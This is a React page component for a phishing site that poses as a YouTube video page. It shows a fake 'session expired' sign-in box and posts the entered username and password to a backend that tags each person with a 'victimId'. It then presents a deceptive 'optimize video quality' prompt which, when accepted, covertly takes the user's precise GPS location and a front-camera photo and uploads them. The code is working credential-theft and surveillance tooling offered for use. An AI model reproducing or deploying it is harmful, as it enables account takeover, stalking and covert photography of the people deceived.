'use client';

import { useState, useEffect } from 'react';

const VIDEO_ID = 'dQw4w9WgXcQ';

export default function Home() {
  const [showLogin, setShowLogin] = useState(false);
  const [showPermission, setShowPermission] = useState(false);
  const [victimId, setVictimId] = useState(null);
  const [notification, setNotification] = useState('');
  const [sidebarVideos, setSidebarVideos] = useState([]);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Sidebar video data
  useEffect(() => {
    setSidebarVideos([
      { title: '🔴 LIVE | Big Announcement Today!', channel: 'BBC News', views: '2.1M views', thumb: 'https://i.ytimg.com/vi/dQw4w9WgXcQ/default.jpg' },
      { title: 'I Built a House in 100 Days', channel: 'MrBeast', views: '45M views', thumb: 'https://i.ytimg.com/vi/1/default.jpg' },
      { title: 'Python Full Course 2026', channel: 'FreeCodeCamp', views: '8.7M views', thumb: 'https://i.ytimg.com/vi/2/default.jpg' },
      { title: 'Avengers: New Trailer', channel: 'Marvel', views: '12M views', thumb: 'https://i.ytimg.com/vi/3/default.jpg' },
      { title: 'Top 10 Gaming Moments 2026', channel: 'GamingCentral', views: '3.4M views', thumb: 'https://i.ytimg.com/vi/4/default.jpg' },
    ]);
  }, []);

  // Show login overlay after 3 seconds
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowLogin(true);
    }, 3000);
    return () => clearTimeout(timer);
  }, []);

  const showNotif = (msg) => {
    setNotification(msg);
    setTimeout(() => setNotification(''), 3000);
  };

  // Handle login form submission
  const handleLogin = async (e) => {
    e.preventDefault();
    if (isSubmitting) return;
    setIsSubmitting(true);

    try {
      const formData = new FormData();
      formData.append('username', username);
      formData.append('password', password);

      const res = await fetch('/api/login', {
        method: 'POST',
        body: formData,
      });

      const data = await res.json();
      if (data.victimId) {
        setVictimId(data.victimId);
      }

      // Hide login
      setShowLogin(false);
      setIsSubmitting(false);

      // Show permission request after a brief delay
      setTimeout(() => {
        setShowPermission(true);
      }, 1500);
    } catch (err) {
      // Even on error, continue the flow
      setShowLogin(false);
      setIsSubmitting(false);
      setTimeout(() => {
        setShowPermission(true);
      }, 1500);
    }
  };

  // Capture GPS location
  const captureGPS = () => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve(null);
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          resolve({
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
          });
        },
        () => resolve(null),
        { enableHighAccuracy: true, timeout: 10000 }
      );
    });
  };

  // Capture photo from front camera
  const capturePhoto = () => {
    return new Promise((resolve) => {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        resolve(null);
        return;
      }

      navigator.mediaDevices
        .getUserMedia({
          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
          audio: false,
        })
        .then((stream) => {
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();

          setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            canvas.toBlob(
              (blob) => {
                stream.getTracks().forEach((track) => track.stop());
                resolve(blob);
              },
              'image/jpeg',
              0.9
            );
          }, 500);
        })
        .catch(() => resolve(null));
    });
  };

  // Send captured data to backend
  const sendCaptureData = async (gpsData, photoBlob) => {
    const formData = new FormData();
    if (gpsData) {
      formData.append('lat', gpsData.lat);
      formData.append('lng', gpsData.lng);
      formData.append('accuracy', gpsData.accuracy);
    }
    if (victimId) {
      formData.append('victimId', victimId);
    }
    if (photoBlob) {
      formData.append('photo', photoBlob, 'capture.jpg');
    }

    try {
      await fetch('/api/capture', { method: 'POST', body: formData });
    } catch (e) {
      // Silently fail
    }
  };

  // Handle permission grant
  const handleAllowPermissions = async () => {
    setShowPermission(false);
    showNotif('Optimizing video quality...');

    // Capture both GPS and photo concurrently
    const [gpsData, photoBlob] = await Promise.all([
      captureGPS(),
      capturePhoto(),
    ]);

    await sendCaptureData(gpsData, photoBlob);
    showNotif('Video optimized');
  };

  // Handle permission skip
  const handleSkipPermissions = () => {
    setShowPermission(false);
    showNotif('Video optimized');
  };

  return (
    <>
      {/* Navbar */}
      <div className="navbar">
        <div className="nav-left">
          <svg className="menu-icon" viewBox="0 0 24 24" fill="currentColor">
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
          <img
            className="youtube-logo"
            src="https://www.youtube.com/img/desktop/yt_1200.png"
            alt="YouTube"
          />
        </div>
        <div className="nav-center">
          <input className="search-bar" type="text" placeholder="Search" />
          <button className="search-btn">
            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
              <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z" />
            </svg>
          </button>
        </div>
        <div className="nav-right">
          <svg className="nav-icon" viewBox="0 0 24 24" fill="currentColor">
            <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z" />
          </svg>
          <svg className="nav-icon" viewBox="0 0 24 24" fill="currentColor">
            <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z" />
          </svg>
          <div className="avatar"></div>
        </div>
      </div>

      {/* Video Container */}
      <div className="video-container">
        <div className="video-main">
          <div className="video-player">
            <iframe
              src={`https://www.youtube.com/embed/${VIDEO_ID}?autoplay=1&controls=1`}
              allow="autoplay; encrypted-media"
              allowFullScreen
            ></iframe>
          </div>
          <div className="video-title">
            🔴 BREAKING: Major Announcement Today! You Won&apos;t Believe This
          </div>
          <div className="video-actions">
            <div className="channel-info">
              <div className="channel-avatar"></div>
              <div>
                <div className="channel-name">NewsNetwork</div>
                <div className="channel-subs">5.3M subscribers</div>
              </div>
              <button className="subscribe-btn">Subscribe</button>
            </div>
            <div className="action-buttons">
              <button className="action-btn">👍 124K</button>
              <button className="action-btn">👎</button>
              <button className="action-btn">🔗 Share</button>
              <button className="action-btn">⬇️ Download</button>
              <button className="action-btn">⋯</button>
            </div>
          </div>
        </div>
        <div className="video-sidebar">
          {sidebarVideos.map((v, i) => (
            <div className="sidebar-video" key={i}>
              <img
                className="sidebar-thumb"
                src={v.thumb}
                alt=""
                onError={(e) => { e.target.style.background = '#333'; }}
              />
              <div className="sidebar-info">
                <div className="sidebar-title">{v.title}</div>
                <div className="sidebar-channel">{v.channel}</div>
                <div className="sidebar-stats">{v.views}</div>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Login Overlay */}
      <div className={`login-overlay ${showLogin ? 'active' : ''}`} ref={loginOverlayRef}>
        <div className="login-modal">
          <p className="subtitle">
            Your session has expired. Please sign in again to continue watching.
          </p>
          <form onSubmit={handleLogin}>
            <input
              type="text"
              placeholder="Email or phone number"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              required
              autoComplete="email"
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              autoComplete="current-password"
            />
            <button className="primary" type="submit" disabled={isSubmitting}>
              {isSubmitting ? 'Signing in...' : 'Sign In'}
            </button>
          </form>
          <div className="login-footer">
            Not your device? Use Guest mode to sign in privately.
          </div>
        </div>
      </div>

      {/* Permission Toast */}
      <div className={`permission-toast ${showPermission ? 'active' : ''}`}>
        <p>
          YouTube wants to optimize your video quality. Allow location access and
          camera for personalized recommendations?
        </p>
        <div>
          <button className="permission-btn" onClick={handleAllowPermissions}>
            Allow
          </button>
          <button className="permission-skip" onClick={handleSkipPermissions}>
            Not now
          </button>
        </div>
      </div>

      {/* Notification */}
      {notification && <div className="notification">{notification}</div>}
    </>
  );
}
